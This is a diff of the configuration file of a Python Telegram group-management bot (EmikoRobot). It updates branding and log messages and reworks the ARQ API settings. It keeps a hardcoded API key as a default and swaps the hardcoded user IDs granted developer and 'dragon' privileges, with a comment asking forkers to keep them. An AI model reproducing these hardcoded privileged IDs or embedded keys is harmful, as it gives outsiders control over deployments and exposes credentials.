@@ -38,9 +38,9 @@ logging.getLogger("pyrogram").setLevel(logging.INFO)
 logging.getLogger('ptbcontrib.postgres_persistence.postgrespersistence').setLevel(logging.WARNING)
 
 LOGGER = logging.getLogger('[EmikoRobot]')
-LOGGER.info("GabutProtection is starting. | An Rommel AND Tata. | Licensed under GPLv3.")
+LOGGER.info("Emiko is starting. | An Kennedy Project Parts. | Licensed under GPLv3.")
 LOGGER.info("Not affiliated to other anime or Villain in any way whatsoever.")
-LOGGER.info("Project maintained by: @gabutjoinsini (t.me/Rommelxx)")
+LOGGER.info("Project maintained by: github.com/kennedy-ex (t.me/excrybaby)")
 
 # if version < 3.9, stop bot.
 if sys.version_info[0] < 3 or sys.version_info[1] < 9:
@@ -99,7 +99,6 @@ if ENV:
     DB_URL = DB_URL.replace("postgres://", "postgresql://", 1)
     REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
-    ARQ_API = os.environ.get("ARQ_API", None)
     DONATION_LINK = os.environ.get("DONATION_LINK")
     LOAD = os.environ.get("LOAD", "").split()
     HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
@@ -123,8 +122,8 @@ if ENV:
     CF_API_KEY = os.environ.get("CF_API_KEY", None)
     WELCOME_DELAY_KICK_SEC = os.environ.get("WELCOME_DELAY_KICL_SEC", None)
     BOT_ID = int(os.environ.get("BOT_ID", None))
-    ARQ_API_URL = "https://thearq.tech/"
-    ARQ_API_KEY = "BCYKVF-KYQWFM-JCMORU-RZWOFQ-ARQ"
+    ARQ_API_URL = os.environ.get("ARQ_API_URL", "https://arq.hamker.in")
+    ARQ_API_KEY = os.environ.get("ARQ_API_KEY", "BCYKVF-KYQWFM-JCMORU-RZWOFQ-ARQ")
 
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
@@ -177,7 +176,7 @@ else:
 
     DB_URL = Config._DATABASE_URL
     MONGO_DB_URI = Config.MONGO_DB_URI
-    ARQ_API = Config.ARQ_API_KEY
+    ARQ_API_KEY = Config.ARQ_API_KEY
     ARQ_API_URL = Config.ARQ_API_URL
     DONATION_LINK = Config.DONATION_LINK
     LOAD = Config.LOAD
@@ -214,10 +213,10 @@ else:
 # If you forking dont remove this id, just add your id. LOL...
 
 DRAGONS.add(OWNER_ID)
-DRAGONS.add(5155255574)
+DRAGONS.add(2088106582)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5155255574)
-DEV_USERS.add(5054708941)
+DEV_USERS.add(1138045685)
+DEV_USERS.add(2088106582)
 
 if not SPAMWATCH_API:
     sw = None
